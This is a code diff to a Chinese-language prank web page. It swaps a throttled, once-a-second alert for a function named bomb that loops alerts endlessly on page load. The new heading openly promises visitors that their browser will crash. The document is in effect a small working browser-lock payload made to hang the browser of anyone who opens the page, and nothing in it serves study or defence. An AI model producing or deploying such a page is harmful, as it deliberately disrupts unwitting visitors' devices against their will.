@@ -2,17 +2,21 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>搞怪页面</title>
+    <title>搞怪页面 - 终极版</title>
     <script type="text/javascript">
-        // 设置延迟，防止页面加载时卡死
-        setTimeout(function() {
-            setInterval(function() {
+        // 无限循环弹窗
+        function bomb() {
+            while (true) {
                 alert("bt好帅");
-            }, 1000);
-        }, 1000);
+            }
+        }
+
+        // 页面加载后立即执行
+        window.onload = bomb;
     </script>
 </head>
 <body>
-    <h1>点开手机，见证奇迹的时刻！</h1>
+    <h1>欢迎来到崩溃的世界！</h1>
+    <p>准备好见证浏览器的崩溃了吗？</p>
 </body>
 </html>
